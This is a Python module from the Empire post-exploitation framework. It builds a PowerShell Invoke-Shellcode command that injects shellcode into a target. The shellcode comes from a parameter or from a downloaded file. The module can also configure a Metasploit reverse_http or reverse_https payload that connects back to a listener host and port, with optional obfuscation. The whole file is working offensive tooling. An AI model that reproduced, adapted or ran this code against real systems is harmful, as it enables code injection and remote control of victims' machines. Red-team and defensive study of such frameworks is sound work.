from __future__ import print_function

from builtins import object, str
from pathlib import Path
from typing import Dict

from empire.server.core.config import empire_config
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        script_end = "\nInvoke-Shellcode -Force"

        listener_name = params["Listener"]
        if listener_name != "":
            if not main_menu.listeners.is_listener_valid(listener_name):
                return handle_error_message("[!] Invalid listener: " + listener_name)
            else:
                # TODO: redo pulling these listener configs...
                # Old method no longer working
                # temporary fix until a more elegant solution is in place, unless this is the most elegant???? :)
                # [ID,name,host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,listener_type,redirect_target,default_lost_limit] = main_menu.listeners.get_listener(listener_name)
                # replacing loadedListeners call with listener_template_service's new_instance method.
                # still doesn't seem right though since that's just laoding in the default. -vr
                host = main_menu.listenertemplatesv2.new_instance(
                    "meterpreter"
                ).options["Host"]
                port = main_menu.listenertemplatesv2.new_instance(
                    "meterpreter"
                ).options["Port"]

                MSFpayload = "reverse_http"
                if "https" in host:
                    MSFpayload += "s"

                hostname = host.split(":")[1].strip("/")
                params["Lhost"] = str(hostname)
                params["Lport"] = str(port)
                params["Payload"] = str(MSFpayload)

        for option, values in params.items():
            if option.lower() != "agent" and option.lower() != "listener":
                if values and values != "":
                    if option.lower() == "shellcode":
                        # transform the shellcode to the correct format
                        sc = ",0".join(values.split("\\"))[0:]
                        script_end += " -" + str(option) + " @(" + sc + ")"
                    elif option.lower() == "file":
                        location = Path(empire_config.directories.downloads) / values
                        with location.open("rb") as bin_data:
                            shellcode_bin_data = bin_data.read()
                        sc = ""
                        for x in range(len(shellcode_bin_data)):
                            sc += "0x{:02x}".format(shellcode_bin_data[x]) + ","
                        script_end += f" -shellcode @({sc[:-1]})"
                    else:
                        script_end += " -" + str(option) + " " + str(values)

        script_end += "; 'Shellcode injected.'"

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
